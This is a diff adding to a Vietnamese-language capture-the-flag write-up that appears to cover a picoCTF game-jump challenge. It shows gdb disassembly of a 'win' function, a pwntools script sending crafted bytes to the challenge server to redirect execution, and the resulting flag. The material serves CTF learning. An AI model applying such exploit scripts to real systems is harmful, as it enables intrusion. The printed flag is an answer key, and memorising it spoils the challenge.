@@ -94,4 +94,47 @@ Chạy trên Local ok rồi
 flag.txt not found in current directory
 [*] Got EOF while reading in interactive
 ```
-*mạng lag quá nó không in ra hết được :( cập nhật sau*
+
+```java
+..........................................................................................
+.........................................................................................X
+[*] Got EOF while reading in interactive
+$
+```
+
+Uhhhggg. Chưa hiểu lý do tại sao nó lại không in ra flag, test trên local thì chạy được. Sau khi thử nhảy đến các câu lệnh phía sau win thì cuối cùng cũng có flag :v
+
+```java
+gef➤  disas win
+Dump of assembler code for function win:
+   0x0804975d <+0>:     push   ebp
+   0x0804975e <+1>:     mov    ebp,esp
+   0x08049760 <+3>:     push   ebx
+   0x08049761 <+4>:     sub    esp,0x44
+   0x08049764 <+7>:     call   0x8049140 <__x86.get_pc_thunk.bx>
+   0x08049769 <+12>:    add    ebx,0x2897
+   0x0804976f <+18>:    nop
+   0x08049770 <+19>:    nop
+   0x08049771 <+20>:    nop
+   0x08049772 <+21>:    nop
+   0x08049773 <+22>:    nop
+   0x08049774 <+23>:    nop
+   0x08049775 <+24>:    nop
+```
+```python
+from pwn import *
+p = remote('saturn.picoctf.net',52427)
+p.sendlineafter(b'\n', b'l\x61')
+p.sendlineafter(b'\n', b'd'*47)
+p.sendlineafter(b'\n', b'w'*5)
+p.interactive()
+```
+
+```java
+..........................................................................................
+..........................................................................................
+.........................................................................................X
+picoCTF{gamer_jump1ng_4r0unD_7a26c512}[*] Got EOF while reading in interactive
+$
+```
+`flag: picoCTF{gamer_jump1ng_4r0unD_7a26c512}`
